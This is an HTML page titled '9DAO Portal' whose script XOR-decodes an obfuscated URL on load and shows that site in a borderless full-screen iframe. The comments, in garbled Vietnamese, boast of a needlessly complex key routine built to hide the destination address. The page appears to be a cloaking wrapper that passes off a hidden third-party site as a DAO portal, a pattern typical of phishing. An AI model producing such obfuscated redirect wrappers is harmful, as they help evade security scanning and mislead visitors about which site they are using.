<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>9DAO Portal</title>
  <style>
    body { margin: 0; padding: 0; overflow: hidden; }
    iframe { width: 100%; height: 100vh; border: none; }
  </style>
</head>
<body>
  <script>
    // üîç M√£ h√≥a XOR th·∫≠t s·ª±
    (function(){
      // 1. Data ƒë∆∞·ª£c XOR v·ªõi key = 5
      const data = [
        0x6d, 0x71, 0x71, 0x75, 0x76, 0x3f, 0x2a, 0x2a,  // "https://" XOR 5
        0x76, 0x6d, 0x60, 0x61, 0x28, 0x72, 0x77, 0x64,  // "shed-wra" XOR 5  
        0x75, 0x28, 0x34, 0x35, 0x3d, 0x32, 0x35, 0x35,  // "p-108700" XOR 5
        0x37, 0x33, 0x2b, 0x63, 0x6c, 0x62, 0x68, 0x64,  // "26.figma" XOR 5
        0x2b, 0x76, 0x6c, 0x71, 0x60, 0x2a               // ".site/" XOR 5
      ];
      
      // 2. Key c·ª±c ph·ª©c t·∫°p
      const obfuscate = {
        _data: [0x39, 0x44, 0x41, 0x4F], // "9DAO"
        _salt: 0xDEADBEEF,
        _mix: function(x) { return ((x << 3) ^ (x >>> 5)) & 0xFF; },
        getKey: function() {
          let hash = this._data.reduce((a,b,i) => a + this._mix(b) * (i+1), 0);
          return ((hash ^ this._salt) >>> 8) % 256;
        }
      };
      const key = obfuscate.getKey(); // V·∫´n = 5 nh∆∞ng c·ª±c k√¨ ph·ª©c t·∫°p
      
      // 3. Gi·∫£i m√£ XOR
      function getUrl() {
        let url = '';
        for(let i = 0; i < data.length; i++) {
          url += String.fromCharCode(data[i] ^ key);
        }
        return url;
      }
      
      // 3. T·∫°o iframe
      const iframe = document.createElement('iframe');
      iframe.src = getUrl();
      iframe.allowFullscreen = true;
      document.body.appendChild(iframe);
    })();
  </script>
</body>
</html>
